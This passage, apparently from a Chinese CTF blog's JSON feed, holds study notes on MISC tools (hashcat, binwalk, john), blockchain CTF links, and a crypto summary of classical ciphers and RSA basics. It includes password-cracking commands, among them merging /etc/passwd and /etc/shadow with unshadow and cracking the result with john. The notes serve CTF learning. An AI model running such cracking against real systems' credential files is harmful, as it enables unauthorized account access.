src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240128091141713.png&quot; alt=&quot;image-20240128091141713&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p><code>notepad.exe 123.txt:hidden.txt</code>    查看隐写文件</p>\n<p><strong>Ntfs Streams Editor</strong> 可以用于解题</p>\n<h1 id=\"工具使用\"><a class=\"anchor\" href=\"#工具使用\">#</a> 工具使用</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGVyZnNreS9wLzE3NzM5MDE2Lmh0bWw=\">【CTF】MISC 常用工具集锦 / 使用方法简介 (施工中) - PerfSakuya - 博客园 (cnblogs.com)</span></p>\n<h2 id=\"hashcat\"><a class=\"anchor\" href=\"#hashcat\">#</a> hashcat</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmcvYXJ0aWNsZS9kZXRhaWxzLzEwNjExMTQ5Mw==\">hashcat 详细使用教程_hashcat 怎么用 - CSDN 博客</span></p>\n<p><strong>hashcat 常用命令</strong><br />\n <code>-m                           指定哈希类型</code></p>\n<p><code>-a                            指定破解模式</code></p>\n<p><code>-V                            查看版本信息</code></p>\n<p><code>-o                            将输出结果储存到指定文件</code></p>\n<p><code>--force                     忽略警告</code></p>\n<p><code>--show                    仅显示破解的hash密码和对应的明文</code></p>\n<p><code>--remove                 从源文件中删除破解成功的hash</code></p>\n<p><code>--username             忽略hash表中的用户名</code></p>\n<p><code>-b                             测试计算机破解速度和相关硬件信息</code></p>\n<p><code>-O                            限制密码长度</code></p>\n<p><code>-T                            设置线程数</code></p>\n<p><code>-r                             使用规则文件</code></p>\n<p><code>-1                             自定义字符集  -1 0123asd     ?1=&#123;0123asd&#125;</code></p>\n<p><code>-2                             自定义字符集  -2 0123asd    ?2=&#123;0123asd&#125;</code></p>\n<p><code>-3                             自定义字符集  -3 0123asd    ?3=&#123;0123asd&#125;</code></p>\n<p><code>-i                              启用增量破解模式</code></p>\n<p><code>--increment-min       设置密码最小长度</code></p>\n<p><code>--increment-max      设置密码最大长度</code></p>\n<p><strong>hashcat 破解模式介绍</strong><br />\n <code>0    straight                                           字典破解</code></p>\n<p><code>1    combination                                    将字典中密码进行组合（1 2&gt;11 22 12 21）</code></p>\n<p><code>3    brute-force                                      使用指定掩码破解</code></p>\n<p><code>6    Hybrid Wordlist + Mask                  字典+掩码破解</code></p>\n<p><code>7    Hybrid Mask  + Wordlist                 掩码+字典破解</code></p>\n<p><strong>hashcat 集成的字符集</strong><br />\n <code>?l                代表小写字母</code></p>\n<p><code>?u              代表大写字母</code></p>\n<p><code>?d              代表数字</code></p>\n<p><code>?s              代表特殊字符</code></p>\n<p><code>?a              代表大小写字母、数字以及特殊字符</code></p>\n<p><code>?b               0x00-0xff</code></p>\n<p><strong>使用字典进行破解</strong></p>\n<p><code>hashcat -a 0 0192023a7bbd73250516f069df18b500 password.txt --force</code></p>\n<p><strong>使用指定字符集进行破解</strong></p>\n<p><code>hashcat -a 3 63a9f0ea7bb98050796b649e85481845 ?l?l?l?l --force</code></p>\n<p><strong>使用字典 + 掩码进行破解</strong></p>\n<p><code>hashcat -a 6 1844156d4166d94387f1a4ad031ca5fa password.txt ?d?d?d --force</code></p>\n<p><strong>使用掩码 + 字典进行破解</strong></p>\n<p><code>hashcat -a 7 f8def8bcecb2e7925a2b42d60d202deb  ?d?d password.txt  --force</code></p>\n<p>如果破解时间太长，可以按 s 键查看破解进度，p 键暂停，r 键继续破解，q 键退出破解。</p>\n<h2 id=\"binwalk\"><a class=\"anchor\" href=\"#binwalk\">#</a> binwalk</h2>\n<p><strong>隐写分离神器</strong></p>\n<ul>\n<li>binwalk 是用于搜索给定二进制镜像文件以获取嵌入的文件和代码的工具</li>\n<li>常用参数：\n<ul>\n<li>-M：根据 magic 签名扫描结果进行递归提取</li>\n<li>-e：使用默认的预定义配置文件 extract.conf 提取探测到的文件系统</li>\n<li>-d：限制递归提取的深度，默认为 8</li>\n<li>-l：显示完整的扫描结果</li>\n<li>-A：确定 CPU 的架构</li>\n</ul>\n</li>\n</ul>\n<pre><code>$ binwalk -h\n# 或者\n$ binwalk --help\n</code></pre>\n<p><code>binwalk *.png</code>  查看文件成分</p>\n<p><code>binwalk -e *.png</code>  分离出文件</p>\n<h2 id=\"tomatotools\"><a class=\"anchor\" href=\"#tomatotools\">#</a> TomatoTools</h2>\n<p>输入密文，右键选择解密方式，还可以安装插件</p>\n<h2 id=\"john\"><a class=\"anchor\" href=\"#john\">#</a> john</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NTk4MTk0NTE/dXRtX3NvdXJjZT13ZWNoYXRfc2Vzc2lvbiZhbXA7dXRtX21lZGl1bT1zb2NpYWwmYW1wO3Nfcj0w\">https://zhuanlan.zhihu.com/p/559819451?utm_source=wechat_session&amp;utm_medium=social&amp;s_r=0</span></p>\n<p>快速破解各种 hash</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wget http://www.openwall.com/john/j/john-1.8.0.tar.gz </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>tar -xf john-1.8.0.tar.gz </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cd john-1.8.0/src/</pre></td></tr></table></figure><p>具体的其他选项可通过 john --help 查看，这列举常用的几个：</p>\n<ol>\n<li>--single 简单破解模式，也是默认的执行模式，就是根据用户和家目录名进行一些简单的变形猜解</li>\n<li>--incremental 逐个遍历模式，其实跟 hashcat 的 increment 模式是一样的，直到尝试完所有可能的组合</li>\n<li>--wordlist 纯字典模式，后面跟上字典的路径即可</li>\n<li>--show 显示已经破解出来的 hash 及所对应的明文密码</li>\n<li>--users 只破解指定用户的 hash, 可以是用户名或者对应的 uid</li>\n<li>--groups 只破解指定用户组的 hash, 可以是组名或者对应的 gid</li>\n<li>--shells 只破解指定 shell 的 hash, 可以用逗号分隔多个 shell 程序</li>\n</ol>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>实际破解中推荐的爆破顺序,为了尽量节省爆破时间,可以自行尝试:\t</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>single模式 -> wordlist模式 -> incremental模式 -> 默认模式(single+incremental)</pre></td></tr></table></figure><p><strong>合并 linux 用户的信息和密码 hash 值</strong></p>\n<p><code>cd ~</code> <br />\n <code>sudo unshadow /etc/passwd /etc/shadow &gt; passwd_shadow</code></p>\n<p><strong>默认模式</strong></p>\n<p><code>john --user=ww passwd_shadow</code></p>\n<p><strong>single 模式</strong></p>\n<p><code>john --single --user=ww passwd_shadow</code></p>\n<p><strong>wordlist 模式</strong></p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># 需要提前建立一个字典文件pass.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>john --wordlist=pass.txt --user=ww passwd_shadow</pre></td></tr></table></figure><p><strong>incremental 模式</strong></p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>#以数字类型举例： </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>john --incremental:digits --users=ww passwd_shadow</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>破解模式的具体方法      破解的密码长度       所包含的字符</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Incremental:all         0-8                  All 95 printable ASCII characters</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Incremental:all15       0-5                  All 95 printable ASCII characters</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Incremental:all6        6                    All 95 printable ASCII characters</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Incremental:all7        7                    All 95 printable ASCII characters</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Incremental:all8        8                    All 95 printable ASCII characters</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Incremental:alpha       1-8                  A-Z     纯大写字母</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Incremental:digits      1-8                  0-9     纯数字</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Incremental:lanman      0-7\t\t    A-Z, 0-9, and some special characters   大写字母,数字加 </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                                    一些特殊字符</pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "CTF_MISC"
            ]
        },
        {
            "id": "http://yoursite.com/CTF/Blockchain/",
            "url": "http://yoursite.com/CTF/Blockchain/",
            "title": "CTF-Blockchain总结",
            "date_published": "2024-03-10T15:29:08.000Z",
            "content_html": "<hr />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIzc2VjLm5vdGlvbi5zaXRlLzhlOTI3NGQ2ZGJiYzRmZjE4ZDkwMzQxNzlhMTczZmNhP3Y9N2VhMmMzZWRkMjUxNGM3ZGI4MGZhNjFkYjc1NzEyOTE=\">DeFi Hacks Analysis - 漏洞根本原因分析</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaXRjeHkuY29tLzIwMjAvc2VjdXJpdHlpbm5vdmF0aW9uLw==\">pikachu's blog web3 靶场</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaXRjeHkuY29tL2NhdGVnb3JpZXMvU29saWRpdHkv\">pikachu's blog solidity</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pbmFtaW5hby9jdGYtYmxvY2tjaGFpbg==\">A summary of 100+ CTF blockchain challenges</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvYmxvY2tjaGFpbi9jaGFsbGVuZ2VzLw==\">CTF-wiki：Bloackchain</span></p>\n",
            "tags": [
                "CTF",
                "CTF_Blockchain"
            ]
        },
        {
            "id": "http://yoursite.com/CTF/Crypto/",
            "url": "http://yoursite.com/CTF/Crypto/",
            "title": "CTF-Crypto总结",
            "date_published": "2024-03-10T15:29:08.000Z",
            "content_html": "<hr />\n<hr />\n<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<ul>\n<li>\n<p>信息安全基本要素：CIAAN</p>\n<ul>\n<li>机密性（Confidentiality）</li>\n<li>完整性（Integrity）</li>\n<li>可用性（Availability）</li>\n<li>认证性（Authentication）</li>\n<li>不可否认性（Non-repudiation）</li>\n</ul>\n</li>\n<li>\n<p>古典密码</p>\n<ul>\n<li>单表替</li>\n<li>换加密：移位加密</li>\n<li>多表替换加密：维吉尼亚加密 =&gt; 流加密（现代）</li>\n<li>多字母替换加密 =&gt; 分组加密（现代）</li>\n<li>攻击方式：词频分析，唯密文攻击 CCA</li>\n</ul>\n</li>\n<li>\n<p>现代密码</p>\n<ul>\n<li>对称加密：以  <code>DES，AES，RC4</code>  为代表</li>\n<li>非对称加密：以  <code>RSA，ElGamal，椭圆曲线加密</code> 为代表</li>\n<li>哈希函数：以  <code>MD5，SHA-1，SHA-512</code>  等为代表</li>\n<li>数字签名：以  <code>RSA 签名，ElGamal 签名，DSA 签名</code> 为代表</li>\n</ul>\n</li>\n<li>\n<p>攻击类型</p>\n<ul>\n<li>唯密文攻击 COA：只拥有密文</li>\n<li>已知明文攻击 KPA：拥有密文与对应的明文</li>\n<li>选择明文攻击 CPA：拥有加密权限，能够对明文加密后获得相应密文</li>\n<li>选择密文攻击 CCA：拥有解密权限，能够对密文解密后获得相应明文</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"古典密码\"><a class=\"anchor\" href=\"#古典密码\">#</a> 古典密码</h1>\n<ol>\n<li>\n<p>维吉尼亚密码：将凯撒密码的全部 25 种位移排序为一张表，与原字母序列共同组成 26 行及 26 列的字母表。另外，维吉尼亚密码必须有一个密钥，这个密钥由字母组成，最少一个，最多可与明文字母数量相等。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGFvZ2UxMjM0NTYuZ2l0aHViLmlvLyVFNyVCQiVCNCVFNSU5MCU4OSVFNSVCMCVCQyVFNCVCQSU5QSVFNSU4QSVBMCVFOCVBNyVBMyVFNSVBRiU4NiVFNSU4RiU4QSVFNSU5NCVBRiVFNSVBRiU4NiVFNiU5NiU4NyVFNyVBMCVCNCVFOCVBNyVBMy5odG1sLyNtb3Jl\">维吉尼亚加解密及唯密文破解 | 小生很忙 (chaoge123456.github.io)</span>，<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5hdG9vbGJveC5uZXQvVG9vbC5waHA/SWQ9ODU2JUVGJUJDJThDaHR0cHM6Ly93d3cuZ3ViYWxsYS5kZS92aWdlbmVyZS1zb2x2ZXIlRUYlQkMlOENodHRwczovL3d3dy5xcXhpdXppLmNuL2JpYW5tYS93ZWlqaW5peWFtaW1hLnBocA==\">http://www.atoolbox.net/Tool.php?Id=856，https://www.guballa.de/vigenere-solver，https://www.qqxiuzi.cn/bianma/weijiniyamima.php</span></p>\n</li>\n<li>\n<p>凯撒密码：SWPUCTF2021 ez_caesarhttps://www.nssctf.cn/problem/430，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEva2Fpc2FtaW1hLnBocCVFRiVCQyU4Qw==\">https://www.qqxiuzi.cn/bianma/kaisamima.php，</span> <code>base64.b64decode(&quot;U1hYSFlLe2R0em1mYWpwc3RiaGZqeGZ3fQ==&quot;)</code>  输出是字节流， <code>str(*, encoding='utf-8')</code></p>\n</li>\n<li></li>\n</ol>\n<h1 id=\"解码解密\"><a class=\"anchor\" href=\"#解码解密\">#</a> 解码 &amp; 解密</h1>\n<ol>\n<li>\n<p>JWT 解密<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qd3QuaW8v\"> JSON Web Tokens - jwt.io</span>： <code>Header.Payload.Signature</code></p>\n</li>\n<li>\n<p>字母表编码，ASCII 编码</p>\n</li>\n<li>\n<p>URL 编码 https://tool.chinaz.com/tools/urlencode.aspx</p>\n</li>\n<li>\n<p>UTF-7http://toolswebtop.com/text/process/decode/utf-7</p>\n</li>\n<li>\n<p>摩斯电码 https://www.ip138.com/mosi/</p>\n</li>\n<li>\n<p>Base16（HEX）<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvYmFzZS5waHA/dHlwZT0xNg==\">https://www.qqxiuzi.cn/bianma/base.php?type=16</span></p>\n</li>\n<li>\n<p>Base32https://www.qqxiuzi.cn/bianma/base.php，<span class=\"exturl\" data-url=\"aHR0cDovL3RvbWVrby5uZXQvb25saW5lX3Rvb2xzL2Jhc2UzMi5waHA=\">http://tomeko.net/online_tools/base32.php</span></p>\n</li>\n<li>\n<p>Base58http://www.metools.info/code/c74.html</p>\n</li>\n<li>\n<p>Base64https://base64.us/</p>\n</li>\n<li>\n<p>base85http://www.atoolbox.net/Tool.php?Id=934</p>\n</li>\n<li>\n<p>base92http://www.hiencode.com/base92.html</p>\n</li>\n<li>\n<p>JsFuckhttps://www.bugku.com/tools/jsfuck/#</p>\n</li>\n<li>\n<p>JS 反混淆<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qcy1kZW9iZnVzY2F0b3IudmVyY2VsLmFwcC8jZU5wTmtERlB3MEFNaGYrTDV3eUF4SEliU3RnSUF3d01pT0dhYzY5V0wzWmtYNENxNm4vdnBaZFdIVzIvOS9uWlJ4akFBVFFnNEk1QTlwbFZPSDdnS0w4SWJ1dVRZUVBFaVJpLzFFOFRxblU0NVIyNHB3WUNEaEpRMzJUd21ZUjd6RHNKQldkWmllT0xxajhVOHFwcWZVcXR6SnpCUFQ0L05QZWloQndYWk8xam5xZTJPR3F1Z0VhUnU4cDQ5K1BhSnFzWjF3RzRySE5KaXY4NHJFdEtQckxlNi82Vi9TWVZXMVhzOGZBbkdnemNkMkZ2NWhpTCsyZlJka3QxdTNuMEhCZlg5UVhXRTlPV01GeHhsOEhwZEFhSjRtOVE=\"> JS Deobfuscator</span></p>\n</li>\n<li>\n<p>UUencode（二进制信息和文字信息转换）<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vdXUuaHRtbA==\">http://www.hiencode.com/uu.html</span></p>\n</li>\n<li>\n<p>md5https://www.somd5.com/、<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY21kNS5jb20v\">https://www.cmd5.com/</span></p>\n</li>\n<li>\n<p>DES/3DES（key）<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29qc29uLmNvbS9lbmNyeXB0X3RyaXBsZV9kZXMuaHRtbCVFRiVCQyU4Q0RFUyVFNSVBRiU4NiVFNiU5NiU4NyVFNSVCQyU4MCVFNSVBNCVCNCVFOSU4MyVCRCVFNiU5OCVBRg==\">https://www.sojson.com/encrypt_triple_des.html，DES 密文开头都是</span> <code>U2FsdGVkX1</code></p>\n</li>\n<li>\n<p>AES（key，iv）<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qc29ucy5jbi9hZXNlbmNyeXB0LyVFRiVCQyU4Q2h0dHA6Ly90b29sLmNoYWN1by5uZXQvY3J5cHRhZXM=\">http://www.jsons.cn/aesencrypt/，http://tool.chacuo.net/cryptaes</span></p>\n</li>\n<li>\n<p>一元二次方程在线 http://www.ab126.com/shuxue/8009.html、<span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29sLjUyMDEwMS5jb20vY2FsY3VsYXRvci95aXl1YW5lcmNpLw==\">https://tool.520101.com/calculator/yiyuanerci/</span></p>\n</li>\n<li>\n<p>词频分析，密文长度足够长的时使用 http://quipqiup.com/</p>\n</li>\n<li>\n<p>培根密码：<span class=\"exturl\" data-url=\"aHR0cDovL3J1bWtpbi5jb20vdG9vbHMvY2lwaGVyL2JhY29uaWFuLnBocA==\">http://rumkin.com/tools/cipher/baconian.php</span></p>\n</li>\n<li>\n<p>栅栏密码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvemhhbGFubWltYS5waHAlRUYlQkMlOENodHRwOi8vd3d3Lm1ldG9vbHMuaW5mby9jb2RlL2ZlbmNlMTU0Lmh0bWw=\">https://www.qqxiuzi.cn/bianma/zhalanmima.php，http://www.metools.info/code/fence154.html</span></p>\n</li>\n<li>\n<p>甲子年表</p>\n</li>\n<li>\n<p>传统猪圈密码：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vcGlncGVuLmh0bWw=\">http://www.hiencode.com/pigpen.html</span></p>\n</li>\n<li>\n<p>猪圈变种密码：</p>\n</li>\n<li>\n<p>音符密码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvd2VuYmVuamlhbWkucGhwP3M9eWlueXVl\">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</span></p>\n</li>\n<li>\n<p>敲击码</p>\n<pre><code>  1  2  3  4  5\n1 A  B C/K D  E\n2 F  G  H  I  J\n3 L  M  N  O  P\n4 Q  R  S  T  U\n5 V  W  X  Y  Z\n\n..... ../... ./... ./... ../\n  5,2     3,1    3,1    3,2\n   W       L      L      M\n</code></pre>\n</li>\n<li>\n<p>四方密码 https://zh.wikipedia.org/wiki/% E5%9B%9B% E6%96% B9% E5% AF%86% E7% A2% BC</p>\n</li>\n<li>\n<p>WingDing 编码 https://lingojam.com/WingDing</p>\n</li>\n<li>\n<p>Emoji 表情编码 http://www.atoolbox.net/Tool.php?Id=937</p>\n</li>\n<li>\n<p>jjencodehttp://www.hiencode.com/jjencode.html</p>\n</li>\n<li>\n<p>aaencodehttp://www.atoolbox.net/Tool.php?Id=703</p>\n</li>\n<li>\n<p>中文电码表 https://dianma.bmcx.com/，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nankuYmlmdC5lZHUuY24vdHpnZy8yMjc3Ni5odG0=\">https://gjy.bift.edu.cn/tzgg/22776.htm</span></p>\n</li>\n<li>\n<p>五笔编码 https://www.qqxiuzi.cn/bianma/wubi.php</p>\n</li>\n<li>\n<p>时间戳 https://tool.chinaz.com/tools/unixtime.aspx</p>\n</li>\n<li>\n<p>手机键盘密码</p>\n</li>\n<li>\n<p>键盘密码：第一行键盘数字对应字母，再转为手机键盘密码</p>\n</li>\n<li>\n<p>希尔密码 http://www.atoolbox.net/Tool.php?Id=914</p>\n</li>\n<li>\n<p>Rabbit 解密 https://www.sojson.com/encrypt_rabbit.html</p>\n</li>\n<li>\n<p>Quoted-printable 编码 http://www.mxcz.net/tools/QuotedPrintable.aspx，<span class=\"exturl\" data-url=\"aHR0cDovL3dlYi5jaGFjdW8ubmV0L2NoYXJzZXRxdW90ZWRwcmludGFibGU=\">http://web.chacuo.net/charsetquotedprintable</span></p>\n</li>\n<li>\n<p>曼彻斯特编码</p>\n</li>\n<li>\n<p>brainfuck</p>\n</li>\n<li>\n<p>Ookhttps://www.splitbrain.org/services/ook</p>\n</li>\n<li>\n<p>Serpenthttp://serpent.online-domain-tools.com/</p>\n</li>\n<li>\n<p>核心价值观编码 http://ctf.ssleye.com/cvencode.html，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93dG9vbC5jb20uY24vY3ZlbmNvZGUuaHRtbA==\">https://wtool.com.cn/cvencode.html</span></p>\n</li>\n<li>\n<p>盲文加密解密 https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</p>\n</li>\n<li>\n<p>新约佛论禅 https://ctf.bugku.com/tool/todousharp，<span class=\"exturl\" data-url=\"aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==\">http://hi.pcmoe.net/buddha.html</span></p>\n</li>\n<li>\n<p>DotCode 点码 https://products.aspose.app/barcode/zh-hans/recognize/dotcode，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv\">https://demo.dynamsoft.com/barcode-reader/</span></p>\n</li>\n</ol>\n<h1 id=\"现代密码\"><a class=\"anchor\" href=\"#现代密码\">#</a> 现代密码</h1>\n<p><strong>做 crypto 经常用到的库</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> libgmp-dev</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> libmpfr-dev</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> libmpc-dev</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> python3-pip</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pip <span class=\"token function\">install</span> gmpy2</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> getPrime<span class=\"token punctuation\">,</span> bytes_to_long<span class=\"token punctuation\">,</span> long_to_bytes</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> signal<span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">,</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr></table></figure><h2 id=\"rsa\"><a class=\"anchor\" href=\"#rsa\">#</a> RSA</h2>\n<p><strong>工具</strong></p>\n<ul>\n<li>\n<p>分解质因数，通常用于分解 <code>n</code>  得到 <code>pq</code> <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mYWN0b3JkYi5jb20vaW5kZXgucGhw\">http://www.factordb.com/index.php</span></p>\n</li>\n<li>\n<p>yafu - &lt;!-- 离线分解工具 --&gt;</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>yafu <span class=\"token string\">\"factor(82748279383502845283943271120712436408030814624973629060064917325126552245423)\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yafu-x64.exe <span class=\"token string\">\"factor(@)\"</span> <span class=\"token parameter variable\">-batchfile</span> <span class=\"token number\">1</span>.txt</pre></td></tr></table></figure></li>\n<li>\n<p>公私钥分解 http://tool.chacuo.net/cryptrsakeyparse</p>\n<p>本地使用</p>\n<blockquote>\n<p><code>openssl rsa -pubin -text -modulus -in warmup -in public.key</code></p>\n</blockquote>\n<p>脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>PublicKey <span class=\"token keyword\">import</span> RSA</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>path <span class=\"token operator\">=</span> <span class=\"token string\">r'C:\\public.key'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>key <span class=\"token operator\">=</span> RSA<span class=\"token punctuation\">.</span>import_key<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'e = %d'</span> <span class=\"token operator\">%</span> key<span class=\"token punctuation\">.</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'n = %d'</span> <span class=\"token operator\">%</span> key<span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"加密原理\"><a class=\"anchor\" href=\"#加密原理\">#</a> 加密原理</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 生成素数</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 明文</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token string\">b'Xh1Xxhg'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># e, 一般是 65537</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 加密</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c='</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'n='</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p='</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q='</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#欧拉函数</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>phi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token 